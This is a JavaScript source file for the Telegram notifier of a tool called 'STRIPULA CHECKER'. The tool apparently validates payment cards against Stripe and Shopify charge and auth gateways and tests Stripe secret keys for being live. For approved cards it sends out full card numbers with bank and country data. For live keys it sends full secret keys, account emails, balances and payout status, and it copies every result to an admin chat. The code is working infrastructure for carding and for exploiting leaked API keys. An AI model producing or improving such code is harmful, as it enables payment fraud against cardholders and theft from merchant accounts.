import axios from 'axios';

/**
 * Telegram Bot Service
 * Sends notifications via Telegram Bot API for approved cards, live SK keys, etc.
 * 
 * Sends to:
 * 1. User who performed the action (via their telegram_id)
 * 2. Admin channel/chat (via TELEGRAM_ADMIN_CHAT_ID)
 */
export class TelegramBotService {
    constructor(options = {}) {
        this.botToken = options.botToken || process.env.TELEGRAM_BOT_TOKEN;
        this.adminChatId = options.adminChatId || process.env.TELEGRAM_ADMIN_CHAT_ID;
        this.enabled = !!this.botToken;
        this.baseUrl = `https://api.telegram.org/bot${this.botToken}`;
    }

    /**
     * Send a message via Telegram Bot API
     * @param {string|number} chatId - Telegram chat ID
     * @param {string} text - Message text (supports HTML)
     * @param {Object} options - Additional options
     * @returns {Promise<Object>}
     */
    async sendMessage(chatId, text, options = {}) {
        if (!this.enabled || !chatId) {
            return { success: false, error: 'Bot not configured or no chat ID' };
        }

        try {
            const response = await axios.post(`${this.baseUrl}/sendMessage`, {
                chat_id: chatId,
                text,
                parse_mode: options.parseMode || 'HTML',
                disable_web_page_preview: options.disablePreview ?? true,
                ...options
            }, {
                timeout: 10000
            });

            return { success: true, data: response.data };
        } catch (error) {
            const errorMsg = error.response?.data?.description || error.message;
            console.error(`[TelegramBot] Failed to send message: ${errorMsg}`);
            return { success: false, error: errorMsg };
        }
    }

    /**
     * Notify about an approved/live card
     * @param {Object} params
     * @param {Object} params.user - User object with telegram_id, first_name
     * @param {Object} params.result - Validation result
     * @param {string} params.gateway - Gateway name
     * @param {string} params.type - Validation type (auth, charge, shopify)
     */
    async notifyCardApproved({ user, result, gateway, type }) {
        if (!this.enabled) return;

        const card = result.card || result.fullCard || 'N/A';
        const status = result.status || 'APPROVED';
        const message = result.message || 'Success';
        const bin = result.binData;

        // Format BIN info (scheme is the brand from BIN lookup API)
        const brand = bin?.scheme || bin?.brand || 'Unknown';
        const cardType = bin?.type || 'Unknown';
        const category = bin?.category || '';
        const bank = bin?.bank || 'Unknown';
        const country = bin?.country || 'Unknown';
        const countryFlag = bin?.countryEmoji || this._getCountryFlag(bin?.countryCode);

        // Get user tier display
        const userTier = (user?.tier || 'free').toUpperCase();
        const userName = user?.first_name || 'User';

        // Gateway display name
        const gatewayDisplay = this._formatGatewayName(gateway, type);

        // Status emoji
        const statusEmoji = status === 'APPROVED' ? '✅' : status === 'LIVE' ? '🟢' : '✓';

        // Clean professional template
        const cardInfo = [brand, cardType, category].filter(Boolean).join(' • ');
        
        const formattedMessage = `
<b>💎 STRIPULA CHECKER</b>

${statusEmoji} <b>${status}</b>
━━━━━━━━━━━━━━━━━━━━
💳 <code>${card}</code>

📋 <b>Card:</b> ${cardInfo}
🏦 <b>Bank:</b> ${bank}
🌍 <b>Country:</b> ${country} ${countryFlag}

🔗 <b>Gateway:</b> ${gatewayDisplay}
👤 <b>User:</b> ${userName} [${userTier}]
━━━━━━━━━━━━━━━━━━━━
<i>⚡ Dev by Howard</i>
`.trim();

        // Send to user
        if (user?.telegram_id) {
            await this.sendMessage(user.telegram_id, formattedMessage);
        }

        // Send to admin
        if (this.adminChatId) {
            await this.sendMessage(this.adminChatId, formattedMessage);
        }
    }

    /**
     * Notify about a live SK key
     * @param {Object} params
     * @param {Object} params.user - User object with telegram_id, first_name
     * @param {Object} params.result - SK check result
     * @param {boolean} params.isManualInput - Whether key was manually input
     */
    async notifyLiveSK({ user, result, isManualInput = false }) {
        if (!this.enabled) return;

        const key = result.fullKey || result.key || 'N/A';
        const status = result.status || 'LIVE';
        // Support both 'balance' and 'availableBalance' field names
        const balance = result.balance ?? result.availableBalance;
        const pendingBalance = result.pendingBalance;
        const currency = result.currency || result.defaultCurrency || 'USD';
        const currencySymbol = result.currencySymbol || this._getCurrencySymbol(currency);
        const accountName = result.accountName || result.account_name || 'N/A';
        const accountEmail = result.accountEmail || 'N/A';
        const accountId = result.accountId || 'N/A';
        const country = result.country || 'N/A';
        const countryFlag = result.countryFlag || '';
        const countryName = result.countryName || country;
        const chargesEnabled = result.chargesEnabled;
        const payoutsEnabled = result.payoutsEnabled;
        const pkKey = result.pkKey;
        const livemode = result.livemode;
        const capabilities = result.capabilities || {};

        // Get user tier display
        const userTier = (user?.tier || 'free').toUpperCase();
        const userName = user?.first_name || 'User';

        // Balance display with available + pending
        let balanceLine = '💵 Balance unavailable';
        if (balance !== undefined && balance !== null) {
            const balanceAmount = (balance / 100).toFixed(2);
            let balanceEmoji = '💵';
            if (status === 'LIVE+') balanceEmoji = '💰';
            else if (status === 'LIVE0') balanceEmoji = '⚖️';
            else if (status === 'LIVE-') balanceEmoji = '📉';
            
            balanceLine = `${balanceEmoji} <b>Available:</b> ${currencySymbol}${balanceAmount} ${currency}`;
            
            // Add pending balance if exists
            if (pendingBalance !== undefined && pendingBalance !== null && pendingBalance !== 0) {
                const pendingAmount = (pendingBalance / 100).toFixed(2);
                balanceLine += `\n⏳ <b>Pending:</b> ${currencySymbol}${pendingAmount} ${currency}`;
            }
        }

        // Capabilities line
        const capLines = [];
        if (chargesEnabled !== undefined) {
            capLines.push(`${chargesEnabled ? '✅' : '❌'} Charges`);
        }
        if (payoutsEnabled !== undefined) {
            capLines.push(`${payoutsEnabled ? '✅' : '❌'} Payouts`);
        }
        if (capabilities.cardPayments !== undefined) {
            capLines.push(`${capabilities.cardPayments ? '✅' : '❌'} Card Payments`);
        }
        if (capabilities.transfers !== undefined) {
            capLines.push(`${capabilities.transfers ? '✅' : '❌'} Transfers`);
        }
        const capabilitiesLine = capLines.length > 0 ? capLines.join(' | ') : '';

        const inputMethod = isManualInput ? 'Manual' : 'Batch';
        
        // Status emoji based on balance status
        let statusEmoji = '🟢';
        let statusLabel = status;
        if (status === 'LIVE+') {
            statusEmoji = '💰';
            statusLabel = 'LIVE (Positive Balance)';
        } else if (status === 'LIVE0') {
            statusEmoji = '⚖️';
            statusLabel = 'LIVE (Zero Balance)';
        } else if (status === 'LIVE-') {
            statusEmoji = '📉';
            statusLabel = 'LIVE (Negative Balance)';
        }
        
        // Mode indicator - production vs test
        const modeLabel = livemode === true ? '🟢 Production' : livemode === false ? '🧪 Test Mode' : '';

        // Build account info section
        let accountSection = `🏢 <b>Account:</b> ${accountName}`;
        if (accountEmail && accountEmail !== 'N/A') {
            accountSection += `\n📧 <b>Email:</b> ${accountEmail}`;
        }
        if (accountId && accountId !== 'N/A') {
            accountSection += `\n🆔 <b>ID:</b> <code>${accountId}</code>`;
        }
        if (countryFlag || countryName !== 'N/A') {
            accountSection += `\n🌍 <b>Country:</b> ${countryFlag} ${countryName}`;
        }

        // Build PK key section if available
        let pkSection = '';
        if (pkKey) {
            pkSection = `\n\n🔓 <b>PK Key:</b>\n<code>${pkKey}</code>`;
        }

        // Clean professional template for SK keys
        const formattedMessage = `
<b>🔑 STRIPULA SK CHECKER</b>

${statusEmoji} <b>${statusLabel}</b>${modeLabel ? `\n📡 <b>Mode:</b> ${modeLabel}` : ''}
━━━━━━━━━━━━━━━━━━━━
🔐 <code>${key}</code>

${accountSection}

${balanceLine}
${capabilitiesLine ? `\n⚡ ${capabilitiesLine}` : ''}${pkSection}

📋 <b>Method:</b> ${inputMethod} Check
👤 <b>User:</b> ${userName} [${userTier}]
━━━━━━━━━━━━━━━━━━━━
<i>⚡ Dev by Howard</i>
`.trim();

        // Send to user
        if (user?.telegram_id) {
            await this.sendMessage(user.telegram_id, formattedMessage);
        }

        // Send to admin
        if (this.adminChatId) {
            await this.sendMessage(this.adminChatId, formattedMessage);
        }
    }

    /**
     * Notify admin only (for system events)
     * @param {string} title - Notification title
     * @param {string} details - Notification details
     */
    async notifyAdmin(title, details) {
        if (!this.enabled || !this.adminChatId) return;

        const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
        const message = `
⚙️ <b>${title}</b>

${details}
⏰ ${timestamp} UTC
`.trim();

        await this.sendMessage(this.adminChatId, message);
    }

    /**
     * Format gateway name for display
     * @private
     */
    _formatGatewayName(gateway, type) {
        const typeMap = {
            'auth': 'Stripe Auth',
            'charge': 'Stripe Charge',
            'shopify': 'Shopify Charge',
            'skbased': 'SK-Based Charge',
            'skbased-auth': 'SK-Based Auth'
        };
        
        const baseName = typeMap[type] || type?.toUpperCase() || 'Unknown';
        
        // Extract version/number from gateway if present
        const match = gateway?.match(/(\d+)$/);
        const version = match ? ` V${match[1]}` : '';
        
        return `${baseName}${version}`;
    }

    /**
     * Get country flag emoji from country code
     * @private
     */
    _getCountryFlag(countryCode) {
        if (!countryCode || countryCode.length !== 2) return '🌍';
        
        // Convert country code to flag emoji
        const codePoints = countryCode
            .toUpperCase()
            .split('')
            .map(char => 127397 + char.charCodeAt(0));
        
        return String.fromCodePoint(...codePoints);
    }

    /**
     * Mask SK key for display
     * @private
     */
    _maskKey(key) {
        if (!key || key.length < 15) return key;
        return `${key.substring(0, 7)}...${key.substring(key.length - 4)}`;
    }

    /**
     * Get currency symbol from currency code
     * @private
     */
    _getCurrencySymbol(currency) {
        const symbols = {
            'USD': '$', 'EUR': '€', 'GBP': '£', 'JPY': '¥', 'CNY': '¥',
            'AUD': 'A$', 'CAD': 'C$', 'CHF': 'Fr', 'HKD': 'HK$', 'SGD': 'S$',
            'INR': '₹', 'BRL': 'R$', 'MXN': 'Mex$', 'KRW': '₩', 'RUB': '₽',
            'SEK': 'kr', 'NOK': 'kr', 'DKK': 'kr', 'PLN': 'zł', 'THB': '฿',
            'MYR': 'RM', 'IDR': 'Rp', 'PHP': '₱', 'VND': '₫', 'TRY': '₺',
            'ZAR': 'R', 'NZD': 'NZ$', 'AED': 'د.إ', 'SAR': '﷼', 'ILS': '₪'
        };
        return symbols[currency?.toUpperCase()] || '';
    }
}

export default TelegramBotService;
